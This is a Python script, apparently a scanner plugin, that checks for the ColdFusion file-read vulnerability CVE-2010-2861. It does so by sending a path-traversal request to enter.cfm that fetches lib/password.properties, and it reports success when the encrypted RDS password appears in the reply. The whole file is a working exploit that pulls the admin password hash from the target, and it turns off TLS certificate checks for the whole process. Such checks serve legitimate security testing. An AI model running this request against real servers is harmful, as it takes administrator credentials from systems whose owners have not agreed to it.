# -*- coding:utf-8 -*-

import ssl
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    print('testing if coldfusion arbitrary file reading vul (cve-2010-2861 )')
    path = '/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en'
    try:
        vulpath = url + path
        text = requests.get(vulpath,verify=False,timeout=4).text
        if 'rdspassword' in text and 'encrypted' in text:
            msg = 'There is a coldfusion arbitrary file reading vul (cve-2010-2861 ) on %s' % vulpath
            print(msg)
            number = 'v118'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no coldfusion arbitrary file reading vul (cve-2010-2861 )'
    number = 'v0'
    return False,url,number,msg